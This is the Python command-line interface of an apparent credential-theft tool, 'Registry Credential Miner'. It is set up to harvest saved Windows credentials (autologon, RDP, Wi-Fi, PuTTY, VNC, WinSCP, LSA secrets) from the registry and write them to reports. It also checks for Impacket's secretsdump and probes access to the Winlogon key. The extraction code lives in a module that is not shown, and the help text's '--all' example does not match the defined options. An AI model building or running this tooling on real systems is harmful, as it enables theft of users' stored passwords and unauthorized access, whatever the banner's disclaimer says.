#!/usr/bin/env python3
"""
Command-line interface for Registry Credential Miner Framework
"""

import argparse
import sys
from pathlib import Path

from .core import RegistryCredentialMiner
from .utils import print_privilege_status


def print_banner():
    """Print framework banner"""
    banner = """
╔═══════════════════════════════════════════════════════════════════╗
║            REGISTRY CREDENTIAL MINER v1.0                         ║
║          Windows Registry Credential Extraction                   ║
║                                                                   ║
║  WARNING: For authorized security testing only                   ║
║  Unauthorized access to computer systems is illegal              ║
╚═══════════════════════════════════════════════════════════════════╝
"""
    print(banner)


def cmd_mine(args):
    """Execute mine command"""
    miner = RegistryCredentialMiner(output_dir=args.output)
    
    if args.target == 'all':
        miner.mine_all()
    else:
        result = miner.mine_target(args.target)
        miner.findings[args.target] = result
    
    # Generate report
    miner.generate_report(save_json=not args.no_json)
    
    return 0


def cmd_list(args):
    """List available miners"""
    miner = RegistryCredentialMiner()
    miner.show_all_miners()
    return 0


def cmd_info(args):
    """Show miner information"""
    miner = RegistryCredentialMiner()
    miner.show_miner_info(args.miner)
    return 0


def cmd_check(args):
    """Check privileges and environment"""
    print_banner()
    
    print(f"\n[*] Environment Check")
    print(f"="*70)
    
    # Check privileges
    print_privilege_status()
    
    # Check tools
    print(f"\n[*] Tool Availability:")
    
    try:
        import subprocess
        result = subprocess.run(
            "secretsdump.py -h",
            shell=True,
            capture_output=True,
            timeout=5
        )
        if result.returncode == 0:
            print(f"    ✓ Impacket secretsdump available")
        else:
            print(f"    ✗ Impacket not installed")
    except:
        print(f"    ✗ Impacket not installed")
    
    print(f"\n[*] Registry Access:")
    print(f"    Testing basic registry access...")
    
    import winreg
    from .utils import safe_open_key
    
    # Test HKLM access (requires admin)
    hklm_test = safe_open_key(
        winreg.HKEY_LOCAL_MACHINE,
        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    )
    
    if hklm_test:
        print(f"    ✓ HKLM access available")
        winreg.CloseKey(hklm_test)
    else:
        print(f"    ✗ HKLM access denied (requires admin)")
    
    # Test HKCU access (always available)
    hkcu_test = safe_open_key(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft"
    )
    
    if hkcu_test:
        print(f"    ✓ HKCU access available")
        winreg.CloseKey(hkcu_test)
    else:
        print(f"    ✗ HKCU access issues")
    
    return 0


def main():
    """Main CLI entry point"""
    parser = argparse.ArgumentParser(
        description='Registry Credential Miner Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Mine all credential sources
  registry_mine.py mine --all
  
  # Mine specific target
  registry_mine.py mine --target autologon
  registry_mine.py mine --target wifi
  
  # List available miners
  registry_mine.py list
  
  # Show miner details
  registry_mine.py info --miner putty
  
  # Check privileges and environment
  registry_mine.py check
"""
    )
    
    parser.add_argument('--version', action='version', version='Registry Miner v1.0')
    parser.add_argument('--output', '-o', default='registry_creds',
                       help='Output directory (default: registry_creds)')
    
    subparsers = parser.add_subparsers(dest='command', help='Commands')
    
    # Mine command
    mine_parser = subparsers.add_parser('mine', help='Mine registry credentials')
    mine_parser.add_argument('--target', '-t',
                            choices=['all', 'autologon', 'rdp', 'wifi', 'putty',
                                   'vnc', 'winscp', 'lsa_secrets'],
                            default='all',
                            help='Target credential type (default: all)')
    mine_parser.add_argument('--no-json', action='store_true',
                            help='Do not save JSON report')
    mine_parser.set_defaults(func=cmd_mine)
    
    # List command
    list_parser = subparsers.add_parser('list', help='List available miners')
    list_parser.set_defaults(func=cmd_list)
    
    # Info command
    info_parser = subparsers.add_parser('info', help='Show miner information')
    info_parser.add_argument('--miner', '-m', required=True,
                            help='Miner name')
    info_parser.set_defaults(func=cmd_info)
    
    # Check command
    check_parser = subparsers.add_parser('check', help='Check privileges and environment')
    check_parser.set_defaults(func=cmd_check)
    
    # Parse arguments
    args = parser.parse_args()
    
    # Show banner
    print_banner()
    
    # Execute command
    if hasattr(args, 'func'):
        return args.func(args)
    else:
        parser.print_help()
        return 1


if __name__ == '__main__':
    sys.exit(main())
